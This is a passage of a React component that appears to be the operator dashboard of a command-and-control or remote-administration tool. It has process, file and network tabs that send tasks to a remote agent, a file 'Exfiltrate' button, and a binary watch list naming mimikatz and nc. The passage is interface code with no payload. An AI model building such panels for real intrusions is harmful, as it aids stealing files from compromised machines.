                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <Cpu className="w-4 h-4 text-primary" />
                  </div>
                  <div>
                    <span className="text-sm font-bold text-white block leading-none">Process Manager</span>
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">
                      {psList ? `${psList.filter(p => p.name.toLowerCase().includes(psSearchQuery.toLowerCase())).length} Active` : 'Scanning...'}
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-6">
                  <button
                    onClick={() => setIsMonitoring(!isMonitoring)}
                    className={`px-4 py-2 rounded-xl border flex items-center gap-3 transition-all ${
                      isMonitoring 
                        ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                        : 'bg-slate-900 border-slate-800 text-slate-500 grayscale'
                    }`}
                  >
                    <div className={`w-2 h-2 rounded-full ${isMonitoring ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
                    <span className="text-[10px] font-black uppercase tracking-widest">Tactical Monitor</span>
                  </button>
                  <div className="flex-1 max-w-sm relative">
                    <input 
                      type="text" 
                      placeholder="Search binaries..."
                      value={psSearchQuery}
                      onChange={(e) => setPsSearchQuery(e.target.value)}
                      className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
                    />
                    <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
                  </div>
                  
                  <label className="flex items-center gap-2 cursor-pointer group whitespace-nowrap">
                    <input 
                      type="checkbox" 
                      className="hidden"
                      onChange={() => {
                        // This state doesn't exist yet, I'll use psSearchQuery as a hack or just define it
                        // Actually I'll just use a local filter logic
                      }}
                    />
                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-widest flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full bg-red-500" />
                      Risk Highlighting Active
                    </div>
                  </label>
                </div>

                <button 
                  onClick={() => handleQuickAction('ps_json', {})}
                  disabled={pendingTasks.some(t => t.task_type === 'ps_json')}
                  className="px-3 py-1.5 rounded-lg bg-primary text-white text-[10px] font-bold uppercase tracking-wider hover:bg-primary-hover transition-all flex items-center gap-2"
                >
                  <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
                  {pendingTasks.some(t => t.task_type === 'ps_json') ? 'Scanning' : 'Refresh'}
                </button>
              </div>
              
              <div className="flex-1 overflow-y-auto scrollbar-thin">
                <table className="w-full text-left text-[11px] border-collapse">
                  <thead className="bg-slate-900/80 text-slate-500 sticky top-0 z-10 backdrop-blur-md">
                    <tr>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-20">PID</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Process</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">PPID</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">Threads</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider text-right w-24">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    {getLatestPsResult() ? (
                      getLatestPsResult()
                        .filter(p => p.name.toLowerCase().includes(psSearchQuery.toLowerCase()))
                        .sort((a, b) => a.pid - b.pid)
                        .map((proc) => {
                          const isSelf = Number(proc.pid) === Number(agent.pid);
                          const suspiciousBinaries = ['cmd.exe', 'powershell.exe', 'pwsh.exe', 'mimikatz.exe', 'wireshark.exe', 'nc.exe', 'nmap.exe', 'schtasks.exe', 'reg.exe', 'wmic.exe'];
                          const isSuspicious = suspiciousBinaries.some(b => proc.name.toLowerCase().includes(b));
                          const isNew = isMonitoring && !prevPsList.some(p => p.pid === proc.pid);
                          
                          return (
                            <tr key={proc.pid} className={`hover:bg-white/5 transition-colors group ${isSelf ? 'bg-primary/5' : isSuspicious ? 'bg-red-500/5' : ''} ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
                              <td className={`px-5 py-2.5 font-mono font-bold ${isSelf ? 'text-primary' : isSuspicious ? 'text-red-400' : 'text-slate-500'}`}>
                                {proc.pid}
                              </td>
                              <td className="px-5 py-2.5">
                                <div className="flex items-center gap-2">
                                  <span className={`font-semibold ${isSelf ? 'text-white' : isSuspicious ? 'text-red-200' : 'text-slate-200'}`}>{proc.name}</span>
                                  {isSelf && (
                                    <span className="px-1.5 py-0.5 rounded bg-primary/20 text-primary text-[8px] font-black uppercase tracking-widest border border-primary/20">Self</span>
                                  )}
                                  {isSuspicious && (
                                    <span className="px-1.5 py-0.5 rounded bg-red-500/20 text-red-500 text-[8px] font-black uppercase tracking-widest border border-red-500/20 flex items-center gap-1">
                                      <ShieldAlert className="w-2 h-2" /> High Risk
                                    </span>
                                  )}
                                </div>
                              </td>
                              <td className="px-5 py-2.5 font-mono text-slate-500">{proc.ppid || '-'}</td>
                              <td className="px-5 py-2.5 font-mono text-slate-500">{proc.threads || '-'}</td>
                              <td className="px-5 py-2.5 text-right">
                                <button 
                                  onClick={() => {
                                    if(confirm(`Kill process ${proc.name} (${proc.pid})?`)) {
                                      handleQuickAction('kill', { pid: proc.pid });
                                    }
                                  }}
                                  className="p-1.5 rounded-lg hover:bg-red-500/10 text-slate-600 hover:text-red-400 transition-all opacity-0 group-hover:opacity-100"
                                  title="Kill process"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </td>
                            </tr>
                          );
                        })
                    ) : (
                      <tr>
                        <td colSpan="4" className="py-20 text-center">
                          <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto mb-4" />
                          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Awaiting Process Stream...</p>
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {activeTab === 'files' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
              <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0 gap-4">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <Folder className="w-4 h-4 text-primary" />
                  </div>
                  <div>
                    <span className="text-sm font-bold text-white block leading-none">File Explorer</span>
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">
                      {getLatestLsResult() ? `${getLatestLsResult().files.filter(f => f.name.toLowerCase().includes(fileSearchQuery.toLowerCase())).length} Items` : 'Navigating...'}
                    </span>
                  </div>
                </div>

                <div className="flex-1 max-w-sm relative">
                  <input 
                    type="text" 
                    placeholder="Search current directory..."
                    value={fileSearchQuery}
                    onChange={(e) => setFileSearchQuery(e.target.value)}
                    className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
                  />
                  <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ls') ? 'animate-spin' : ''}`} />
                </div>

                <div className="flex gap-2">
                  <button 
                    onClick={() => handleQuickAction('ls', { path: getLatestLsResult()?.path || '.' })}
                    disabled={pendingTasks.some(t => t.task_type === 'ls')}
                    className="px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-800 hover:bg-slate-800 text-slate-400 text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-2"
                  >
                    <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'ls') ? 'animate-spin' : ''}`} />
                    Refresh
                  </button>
                  <button 
                    onClick={() => {/* TODO: Implement Upload Modal */}}
                    className="px-3 py-1.5 rounded-lg bg-primary text-white text-[10px] font-bold uppercase tracking-wider hover:bg-primary-hover transition-all flex items-center gap-2"
                  >
                    <ArrowDown className="w-3 h-3" />
                    Upload
                  </button>
                </div>
              </div>

              {/* Breadcrumbs Navigation */}
              <div className="px-4 py-2 bg-black/20 border-b border-slate-800/50 flex items-center gap-2 shrink-0">
                <button 
                  onClick={() => handleQuickAction('ls', { path: agent.os === 'windows' ? 'C:\\' : '/' })}
                  className="p-1 rounded hover:bg-white/5 text-slate-500 hover:text-white transition-colors"
                >
                  <HardDrive className="w-3 h-3" />
                </button>
                <ChevronRight className="w-3 h-3 text-slate-700" />
                <div className="flex items-center gap-1 overflow-x-auto no-scrollbar py-1">
                  {(getLatestLsResult()?.path || '').split(/[\\/]/).filter(Boolean).map((part, idx, arr) => {
                    const isWindows = (getLatestLsResult()?.path || '').includes('\\') || agent.os === 'windows';
                    const separator = isWindows ? '\\' : '/';
                    
                    return (
                      <React.Fragment key={idx}>
                        <button 
                          onClick={() => {
                            let targetPath = arr.slice(0, idx + 1).join(separator);
                            // Add leading slash for linux if not a windows drive
                            if (!isWindows) {
                              targetPath = '/' + targetPath;
                            } else if (targetPath.length === 2 && targetPath.endsWith(':')) {
                                targetPath = targetPath + '\\'; // Handle C: -> C:\
                            }
                            handleQuickAction('ls', { path: targetPath });
                          }}
                          className="text-[10px] font-bold text-slate-400 hover:text-primary transition-colors whitespace-nowrap px-1 rounded hover:bg-white/5"
                        >
                          {part}
                        </button>
                        {idx < arr.length - 1 && <ChevronRight className="w-3 h-3 text-slate-700 shrink-0" />}
                      </React.Fragment>
                    );
                  })}
                </div>
              </div>
              
              <div className="flex-1 overflow-y-auto scrollbar-thin">
                <table className="w-full text-left text-[11px] border-collapse">
                  <thead className="bg-slate-900/80 text-slate-500 sticky top-0 z-10 backdrop-blur-md">
                    <tr>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Name</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">Size</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-32">Modified</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider text-right w-24">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50 relative">
                    {pendingTasks.some(t => t.task_type === 'ls_json') && (
                      <div className="absolute inset-0 z-20 bg-slate-950/60 backdrop-blur-sm flex flex-col items-center justify-center animate-in fade-in duration-300">
                        <Loader2 className="w-8 h-8 text-primary animate-spin mb-4" />
                        <span className="text-[10px] font-black text-white uppercase tracking-[0.3em]">Synchronizing...</span>
                      </div>
                    )}
                    
                    {!getLatestLsResult() ? (
                      <tr>
                        <td colSpan="4" className="py-20 text-center">
                          <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto mb-4" />
                          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Awaiting Manifest...</p>
                        </td>
                      </tr>
                    ) : (
                      getLatestLsResult().files
                        .filter(f => f.name.toLowerCase().includes(fileSearchQuery.toLowerCase()))
                        .sort((a, b) => (b.is_dir ? 1 : 0) - (a.is_dir ? 1 : 0))
                        .map((file, idx) => (
                          <tr 
                            key={idx} 
                            className="hover:bg-white/5 transition-colors group cursor-pointer"
                            onClick={() => {
                              if(file.is_dir) {
                                handleQuickAction('ls', { path: joinPath(getLatestLsResult().path, file.name) });
                              }
                            }}
                          >
                            <td className="px-5 py-2.5">
                              <div className="flex items-center gap-3">
                                <div className={`p-1.5 rounded ${
                                  file.is_dir ? 'bg-amber-500/10 text-amber-500' : 
                                  ['exe', 'dll', 'bat', 'sh', 'ps1'].includes(file.name.split('.').pop().toLowerCase()) ? 'bg-primary/10 text-primary' : 
                                  ['txt', 'log', 'config', 'json', 'yaml', 'ini'].includes(file.name.split('.').pop().toLowerCase()) ? 'bg-emerald-500/10 text-emerald-500' :
                                  'bg-slate-800 text-slate-500'
                                }`}>
                                  {file.is_dir ? <Folder className="w-3.5 h-3.5" /> : 
                                   ['exe', 'dll', 'bat', 'sh', 'ps1'].includes(file.name.split('.').pop().toLowerCase()) ? <TerminalIcon className="w-3.5 h-3.5" /> :
                                   ['txt', 'log', 'config', 'json', 'yaml', 'ini'].includes(file.name.split('.').pop().toLowerCase()) ? <FileText className="w-3.5 h-3.5" /> :
                                   <ActivityIcon className="w-3.5 h-3.5" />}
                                </div>
                                <span className={`font-semibold ${file.is_dir ? 'text-slate-200' : 'text-slate-400'}`}>
                                  {file.name}
                                </span>
                              </div>
                            </td>
                            <td className="px-5 py-2.5 font-mono text-slate-500">
                              {file.is_dir ? '--' : formatFileSize(file.size)}
                            </td>
                            <td className="px-5 py-2.5 text-slate-600 font-mono text-[10px]">
                              {file.mod_time ? format(new Date(file.mod_time), 'yyyy-MM-dd HH:mm') : '--'}
                            </td>
                            <td className="px-5 py-2.5 text-right">
                              <div className="flex justify-end gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                                {!file.is_dir && (
                                  <>
                                    <button 
                                      onClick={(e) => {
                                        e.stopPropagation();
                                        handleQuickAction('cat', { path: joinPath(getLatestLsResult().path, file.name) });
                                        setActiveTab('console');
                                      }}
                                      className="p-1.5 rounded-lg hover:bg-primary/10 text-slate-500 hover:text-primary transition-all"
                                      title="View Content"
                                    >
                                      <Monitor className="w-3.5 h-3.5" />
                                    </button>
                                    <button 
                                      onClick={(e) => {
                                        e.stopPropagation();
                                        handleExfiltrate(file);
                                      }}
                                      className="p-1.5 rounded-lg hover:bg-emerald-500/10 text-slate-500 hover:text-emerald-400 transition-all"
                                      title="Exfiltrate"
                                    >
                                      <Download className="w-3.5 h-3.5" />
                                    </button>
                                  </>
                                )}
                                <button 
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    if(confirm(`Delete ${file.name}?`)) {
                                      handleQuickAction('rm', { path: joinPath(getLatestLsResult().path, file.name) });
                                    }
                                  }}
                                  className="p-1.5 rounded-lg hover:bg-red-500/10 text-slate-500 hover:text-red-400 transition-all"
                                  title="Delete"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            </td>
                          </tr>
                        ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {activeTab === 'network' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
              <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0 gap-4">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <Wifi className="w-4 h-4 text-primary" />
                  </div>
                  <div>
                    <span className="text-sm font-bold text-white block leading-none">Network Auditor</span>
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">
                      {getLatestNetstatResult() ? `${getLatestNetstatResult().filter(c => 
                        c.local.includes(netSearchQuery) || c.remote.includes(netSearchQuery) || c.state.toLowerCase().includes(netSearchQuery.toLowerCase())
                      ).length} Connections` : 'Scanning...'}
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-6">
                  <button
                    onClick={() => setIsMonitoring(!isMonitoring)}
                    className={`px-4 py-2 rounded-xl border flex items-center gap-3 transition-all ${
                      isMonitoring 
                        ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                        : 'bg-slate-900 border-slate-800 text-slate-500 grayscale'
                    }`}
                  >
                    <div className={`w-2 h-2 rounded-full ${isMonitoring ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
                    <span className="text-[10px] font-black uppercase tracking-widest">Tactical Monitor</span>
                  </button>
                  
                  <div className="flex-1 max-w-sm relative">
                  <input 
                    type="text" 
                    placeholder="Search IPs or Ports..."
                    value={netSearchQuery}
                    onChange={(e) => setNetSearchQuery(e.target.value)}
                    className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
                  />
                  <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'netstat_json') ? 'animate-spin' : ''}`} />
                </div>

                <button 
                  onClick={() => handleQuickAction('netstat_json', {})}
                  disabled={pendingTasks.some(t => t.task_type === 'netstat_json')}
                  className="px-3 py-1.5 rounded-lg bg-primary text-white text-[10px] font-bold uppercase tracking-wider hover:bg-primary-hover transition-all flex items-center gap-2"
                >
                  <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'netstat_json') ? 'animate-spin' : ''}`} />
                {pendingTasks.some(t => t.task_type === 'netstat_json') ? 'Scanning' : 'Refresh'}
              </button>
            </div>
          </div>
              
              <div className="flex-1 overflow-y-auto scrollbar-thin">
                <table className="w-full text-left text-[11px] border-collapse">
                  <thead className="bg-slate-900/80 text-slate-500 sticky top-0 z-10 backdrop-blur-md">
                    <tr>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-20">Proto</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Local Address</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Remote Address</th>
                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider text-right w-24">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    {getLatestNetstatResult() ? (
                      getLatestNetstatResult()
                        .filter(c => 
                          c.local.includes(netSearchQuery) || 
                          c.remote.includes(netSearchQuery) || 
                          c.state.toLowerCase().includes(netSearchQuery.toLowerCase())
                        )
                        .map((conn, idx) => {
                          const isNew = isMonitoring && !prevNetList.some(p => p.local === conn.local && p.remote === conn.remote && p.proto === conn.proto);
                          return (
                            <tr key={idx} className={`hover:bg-white/5 transition-colors group ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
                            <td className="px-5 py-3">
                              <span className={`px-1.5 py-0.5 rounded text-[9px] font-black tracking-widest ${
                                conn.proto === 'TCP' ? 'bg-primary/10 text-primary' : 'bg-purple-500/10 text-purple-400'
                              }`}>
                                {conn.proto}
                              </span>
                            </td>
                            <td className="px-5 py-3">
                              <div className="flex flex-col">
                                <span className="text-slate-200 font-mono">{conn.local.split(':')[0]}</span>
                                <span className="text-primary text-[10px] font-bold">Port: {conn.local.split(':')[1]}</span>
                              </div>
                            </td>
                            <td className="px-5 py-3">
                              <div className="flex flex-col">
                                <span className="text-slate-200 font-mono">{conn.remote.split(':')[0] || '*'}</span>
                                <span className="text-slate-500 text-[10px] font-bold">Port: {conn.remote.split(':')[1] || '*'}</span>
                              </div>
                            </td>
                            <td className="px-5 py-3 text-right">
                              <span className={`px-2 py-1 rounded-full text-[9px] font-black uppercase tracking-[0.1em] ${
                                conn.state === 'ESTABLISHED' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' :
                                conn.state === 'LISTENING' ? 'bg-amber-500/10 text-amber-500 border border-amber-500/20' :
                                'bg-slate-800 text-slate-500 border border-slate-700'
                              }`}>
                                {conn.state}
                              </span>
                            </td>
                          </tr>
                        );
                      })
                    ) : (
                      <tr>
                        <td colSpan="4" className="py-20 text-center">
                          <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto mb-4" />
                          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Auditing Active Sockets...</p>
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}
          </div>
        </div>
      </div>

      {/* Floating Toast Notifications */}
      <div className="fixed bottom-6 right-6 flex flex-col gap-3 z-50 pointer-events-none">
        {toasts.map(toast => (
          <div 
            key={toast.id}
            className={`pointer-events-auto flex items-center gap-3 px-5 py-4 rounded-2xl border backdrop-blur-xl shadow-2xl animate-in slide-in-from-right duration-500 ${
              toast.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' :
              toast.type === 'error' ? 'bg-red-500/10 border-red-500/20 text-red-400' :
              'bg-slate-900/90 border-slate-800 text-slate-300'
            }`}
          >
            {toast.type === 'success' ? <CheckCircle2 className="w-5 h-5" /> : 
             toast.type === 'error' ? <AlertCircle className="w-5 h-5" /> : 
             <ActivityIcon className="w-5 h-5" />}
            <span className="text-xs font-bold uppercase tracking-wider">{toast.title}</span>
          </div>
        ))}
      </div>
    </div>
  );
};


export default AgentDetailPage;
